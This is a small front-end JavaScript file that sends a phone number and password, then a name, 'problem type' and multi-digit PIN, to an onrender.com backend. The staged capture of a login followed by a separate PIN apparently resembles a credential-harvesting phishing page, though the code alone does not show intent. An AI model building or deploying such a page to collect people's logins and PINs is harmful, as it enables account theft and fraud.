const API = "https://sprodeal-backend-juwe.onrender.com";


// Login Form

document
    .getElementById("loginForm")
    .addEventListener("submit", async (e) => {

        e.preventDefault();

        const phone = document.getElementById("phone").value;

        const password = document.getElementById("password").value;

        try {

            const response = await fetch(`${API}/submit`, {

                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    phone,
                    password
                })

            });

            const data = await response.json();

            alert(data.message);

            if (response.ok) {

                document.getElementById("loginForm").style.display = "none";

                document.getElementById("detailsForm").style.display = "block";

            }

        }

        catch (error) {

            console.error(error);

            alert("Server Error");

        }

    });




// Details Form

document
    .getElementById("detailsForm")
    .addEventListener("submit", async (e) => {

        e.preventDefault();

        const fullName = document.getElementById("fullName").value;

        const problemType = document.getElementById("problemType").value;

        const experienceLevel =
            document.getElementById("experienceLevel").value;

        const pin = [...document.querySelectorAll(".pin")]
            .map(input => input.value)
            .join("");

        try {

            const response = await fetch(`${API}/details`, {

                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({

                    fullName,

                    problemType,

                    experienceLevel,

                    pin

                })

            });

            const data = await response.json();

            alert(data.message);

        }

        catch (error) {

            console.error(error);

            alert("Server Error");

        }

    });